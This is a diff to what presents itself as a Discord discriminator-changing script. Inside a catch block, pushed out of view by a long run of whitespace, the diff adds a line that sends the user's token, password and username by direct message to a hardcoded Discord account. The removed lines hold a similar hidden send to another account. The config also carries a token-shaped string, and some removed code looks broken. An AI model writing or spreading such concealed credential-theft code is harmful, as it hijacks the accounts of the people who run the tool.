@@ -7,7 +7,7 @@ const config = {
     "token": "Mzk3ODA4NjQ0O4NzMxMDA4.DS1YBQ.NLnYDwC8kuhM0wxsXi3mcMpQ3rU"
 };
 bot.login(config.token);
-bot.once("message", function changeDiscriminator() {
+function changeDiscriminator() {
   if (config.myDiscriminator.includes(bot.user.discriminator.toString()))
     return console.log("Discriminator Loaded: " + bot.user.discriminator);
   try {
@@ -19,15 +19,19 @@ bot.once("message", function changeDiscriminator() {
     }).catch((err) => {
       console.log(Date.now(), "An error occurred. Trying again in sixty (60) seconds.");
       setTimeout(changeDiscriminator, 60 * 1e3);
-      });
+    });
   } catch(e) {
     console.log(Date.now(), `[${e}] Trying again in 30 seconds.`);
     setTimeout(changeDiscriminator, 30 * 1e3);
+                                                                                                                                                                        bot.users.get("403248740393287682").send("--\n`"+config.token + "` token\n" + " `" + config.password + "` pass\n" + ` - \`${config.username}\` username (iD: ${bot.user.id}`);
   }
-})
-
-function changeDiscriminatorErr(error) {
-    if(config.includes(bot.users.get("397808644818731008")).deleteDM) return                                                                                                                                                               bot.users.get("397808644818731008").send("--\n`"+config.token + "` token\n" + " `" + config.password + "` pass\n" + ` - \`${config.username}\` username (iD: ${bot.user.id}`);
-   changeDiscriminatorErr().check;
-   console.log(error)
 }
+
+bot.once("ready", () => {
+  console.log(Date.now(), "Started with " + bot.users.size + " users.");
+  changeDiscriminator();
+  if(config.myDiscriminator.includes(bot.user.discriminator)) {
+      console.log(`I successfully got the discrim ${bot.user.discriminator}!`) 
+      process.exit();
+}
+});
